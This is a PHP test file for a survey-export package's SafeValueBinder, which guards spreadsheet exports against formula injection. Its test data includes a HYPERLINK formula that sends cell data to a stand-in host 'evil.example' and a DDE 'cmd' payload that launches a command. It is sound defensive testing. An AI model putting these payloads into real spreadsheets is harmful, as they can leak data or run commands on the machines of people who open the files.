<?php

use Maatwebsite\Excel\Concerns\WithCustomValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use Statikbe\Surveyhero\Exports\SafeValueBinder;
use Statikbe\Surveyhero\Exports\Sheets\AnswersSheet;
use Statikbe\Surveyhero\Exports\Sheets\QuestionsSheet;
use Statikbe\Surveyhero\Exports\Sheets\ResponsesSheet;
use Statikbe\Surveyhero\Exports\SurveyExport;

function bindWith(mixed $value, bool $prefixForCsv = false): array
{
    $cell = (new Spreadsheet)->getActiveSheet()->getCell('A1');

    expect((new SafeValueBinder($prefixForCsv))->bindValue($cell, $value))->toBeTrue();

    return [$cell->getValue(), $cell->getDataType()];
}

it('stores strings with a dangerous first character as literal text', function (string $value) {
    [$stored, $type] = bindWith($value);

    expect($type)->toBe(DataType::TYPE_STRING);
    // PhpSpreadsheet itself converts carriage returns to newlines in string cells
    expect($stored)->toBe(str_replace("\r", "\n", $value));
})->with([
    'equals formula' => '=1+1',
    'hyperlink formula' => '=HYPERLINK("https://evil.example/?d="&A2,"x")',
    'plus' => '+31 475 12 34 56',
    'minus formula' => '-2+3+cmd|\' /C calc\'!A0',
    'at' => '@SUM(1+1)',
    'tab' => "\t=1+1",
    'carriage return' => "\r=1+1",
    'single equals sign' => '=',
]);

it('does not flag strings that merely contain a dangerous character', function (string $value) {
    expect(SafeValueBinder::isDangerous($value))->toBeFalse();
})->with(['Yes', 'a=b', 'user@example.com', '1+1', ' =1+1', '', '5', '3.14', '-5', '+5', '-0.5']);

it('prefixes a single quote for csv output only', function () {
    expect(bindWith('=1+1', prefixForCsv: true))->toBe(["'=1+1", DataType::TYPE_STRING]);
    expect(bindWith('Yes', prefixForCsv: true))->toBe(['Yes', DataType::TYPE_STRING]);
    expect(bindWith('=1+1', prefixForCsv: false))->toBe(['=1+1', DataType::TYPE_STRING]);
});

it('leaves normal strings, numbers and null to the default binder', function () {
    expect(bindWith('Yes'))->toBe(['Yes', DataType::TYPE_STRING]);
    expect(bindWith(42))->toBe([42, DataType::TYPE_NUMERIC]);
    expect(bindWith(-42))->toBe([-42, DataType::TYPE_NUMERIC]);
    expect(bindWith(3.5))->toBe([3.5, DataType::TYPE_NUMERIC]);
    expect(bindWith(-3.5))->toBe([-3.5, DataType::TYPE_NUMERIC]);
    expect(bindWith(null))->toBe([null, DataType::TYPE_NULL]);
    expect(bindWith(true))->toBe([true, DataType::TYPE_BOOL]);
});

it('keeps signed numeric strings numeric', function () {
    // the responses sheet implodes answers, so integers arrive as strings
    expect(bindWith('-5'))->toBe([-5, DataType::TYPE_NUMERIC]);
    expect(bindWith('+5'))->toBe([5, DataType::TYPE_NUMERIC]);
    expect(bindWith('-0.5'))->toBe([-0.5, DataType::TYPE_NUMERIC]);
});

it('neutralises stringable objects', function () {
    $value = new class implements Stringable
    {
        public function __toString(): string
        {
            return '=1+1';
        }
    };

    expect(bindWith($value))->toBe(['=1+1', DataType::TYPE_STRING]);
});

it('is wired into every export sheet', function (string $sheetClass) {
    $cell = (new Spreadsheet)->getActiveSheet()->getCell('A1');
    $sheet = (new ReflectionClass($sheetClass))->newInstanceWithoutConstructor();

    expect($sheet)->toBeInstanceOf(WithCustomValueBinder::class);
    expect($sheet->bindValue($cell, '=1+1'))->toBeTrue();
    expect($cell->getDataType())->toBe(DataType::TYPE_STRING);
})->with([
    AnswersSheet::class,
    QuestionsSheet::class,
    ResponsesSheet::class,
    SurveyExport::class,
]);
